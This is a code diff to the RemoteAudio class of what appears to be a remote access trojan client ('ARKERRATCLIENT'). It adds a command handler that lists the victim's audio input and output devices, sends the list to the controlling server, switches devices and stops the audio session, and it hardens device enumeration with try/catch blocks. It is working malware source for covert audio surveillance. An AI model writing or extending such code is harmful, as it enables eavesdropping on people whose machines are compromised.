@@ -11,6 +11,32 @@ namespace ARKERRATCLIENT2._0
 {
     public static class RemoteAudio
     {
+        public static void HandleData(string subString)
+        {
+            if (subString.Length == 0)
+            {
+                ApplySettings();
+                Task.Run(() => GetAndSendOutputDevices());
+                Task.Run(() => GetAndSendInputDevices());
+            }
+            else if (subString.Contains("§ODS§"))
+            {
+                subString = subString.Replace("§ODS§", string.Empty);
+                Task.Run(() => ChangeOutputDevice(subString));
+
+            }
+            else if (subString.Contains("§IDS§"))
+            {
+                subString = subString.Replace("§IDS§", string.Empty);
+
+                Task.Run(() => ChangeInputDevice(subString));
+            }
+            else if (subString == "close")
+            {
+                Task.Run(() => StopRemoteAudio());
+            }
+        }
+
         private static MMDeviceEnumerator mMDeviceEnumerator = new MMDeviceEnumerator();
         private static MMDeviceCollection outputDeviceCollection = null;
         private static MMDeviceCollection inputDeviceCollection = null;
@@ -33,7 +59,10 @@ namespace ARKERRATCLIENT2._0
 
             foreach (var device in outputDeviceCollection)
             {
-                stringBuilder.Append(device.ID + "|" + device.FriendlyName.ToString() +" Status:"+device.State.ToString()+ ",");
+                try
+                {
+                    stringBuilder.Append(device.ID + "|" + device.FriendlyName.ToString() + " Status:" + device.State.ToString() + ",");
+                }catch(Exception e) { }
             }
             string data = stringBuilder.Remove(stringBuilder.Length-1,1).ToString() + "§RemoteAudioEnd§";
             await RATClientSession.SendData(data);
@@ -45,7 +74,11 @@ namespace ARKERRATCLIENT2._0
             stringBuilder.Append("§RemoteAudioStart§§IDS§");
             foreach (var device in inputDeviceCollection)
             {
-                stringBuilder.Append( device.ID+ "|" + device.FriendlyName.ToString() + " Status:" + device.State.ToString() + ",");
+                try
+                {
+                    stringBuilder.Append( device.ID+ "|" + device.FriendlyName.ToString() + " Status:" + device.State.ToString() + ",");
+                }
+                catch (Exception e) { }
             }            
             string data = stringBuilder.Remove(stringBuilder.Length-1,1).ToString()+ "§RemoteAudioEnd§";
             await RATClientSession.SendData(data);
@@ -80,7 +113,6 @@ namespace ARKERRATCLIENT2._0
                 return;
             }
         }
-
 
         public static void ChangeInputDevice(string deviceID)
         {
